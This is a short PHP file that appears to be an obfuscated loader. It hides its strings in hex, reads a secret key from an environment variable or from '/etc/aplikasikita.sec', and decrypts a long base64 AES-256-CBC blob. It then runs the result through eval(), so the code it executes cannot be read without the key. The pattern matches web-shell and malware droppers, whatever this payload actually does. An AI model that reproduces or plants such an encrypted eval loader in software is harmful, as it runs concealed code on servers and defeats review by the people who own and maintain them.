<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('389wFxlbF6hMIvYH3yeplg==');

$c=base64_decode(

'd2Xw+/RyxdbB3zRPfK+0TiFybSA0IRiEZUdL+g6DqXgU8+r/ymiI9j8Db4Ei1Fh5e2Q/LKrCAFmx' .
'fxyqJVOydzTeK7gBjRVQ0/Vgz4u5DPaWInO/ZWwsb5YRn6TWn8VZ6VywDGHGsK34qoeVoaNX4q+G' .
'xwS+hCr5mxSE8KRcX7Cdh7xK281bND3zXnUhO3lYGoTchq15QhuMeUI8iP6RtO3pygZVzW/Y50AS' .
'CeW+AHtxeE7yqGSs9ZhehG73IgJnbzN3PFpVLeWqVLeCLLRHYWVgZofpHqUAa032WaXi8RKuZc43' .
'4xJY7G3F1J5CgikDNEtw8yEpBmNoL4rCnxSLc6sbfsUkCVscAuV7YwpqFBz+7g682WKIva+mqLdw' .
'wsHhhJzIVBX1B/18dPGVhXilMf/ReBP3NSFCiAatCXRumOvJeJL51yb9XeRjImfyM2BorSr/ffst' .
'oilOWvXAzObJcZ3ATTdkd1QDFJmV+xBpxQcS1S39Y6flSFQ00qsAI4ICqbicUW6uzAcz7qDaVOq2' .
'0+LAqbDMVUkHkyDa1UP8dMhprVmwTI+J13zkapl1p9WWQYbHmut6D97eiTf2PxNlegRuhdmMpR74' .
'M2PXrtYG4rrx+wiwt3LGslygIyzbP8dIhXR/ZSf1Cs+jbtMilC963cK97doFDd+4n4LDIzyxk1hP' .
'FshD5+YJ1irSRFNQkpQLP4p3LuKcDHnhzRcbjlu/o4E6w4bStWekq+ttbktJl0QJt4Vaie5CwBcJ' .
'nXfTSp+Urq+iLReND6+CVccTnKePvg6ZbMs41ChvIJDxfn8Rje2qZp4Myjcuy2YoqmLUw8r/nZ8n' .
'fJo512FxQt4LFJ6G6VA1CLQoVMGtiXy9+x1PgPSrmOsV6D1mEG9J4KsWJ65iUpfkinWJpFvHkEsq' .
'5GqWHK76H8Py6KB7hpIFiBwrm3SxSfE/2/IR6/Maq3rHnncjdYEKFepyKoXoAFSSXKx7qAdT7aiq' .
'nK/M0VfJAy28F+fbxHnWM5XMnHFW5UOl0FvXoPGup5/LU9ODPaMOw9YQpGg+UD4nkb89IzWKm8is' .
'DYAd3UlvhPoAMQhbeL7ErJVyDBQ/vD/6H1EXRcR/T6qOjkW0tV1FWyBMYcCQDyQu3aTYZBZelJfN' .
'ItAb5jYKHJlg7s85B9Z6AFsSuVg6TkL4uN+W3496vLJYTEwdZYe4sDCCTblTvSYm9L8kgZpvFIo3' .
'5MyqCGqmS4luUl5X43xm7y+bL7wMDmwQWqytlFV6hoR+cDUFY32m/abfdfu8ruRH685XCe19lAzL' .
'nBApqt0CALa+fQEVGsz8aROSpHbL6rqTSgvy3u+zPoQ4D7l2/lHGoiDeSfwgmXlsCDFdqwRgPw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

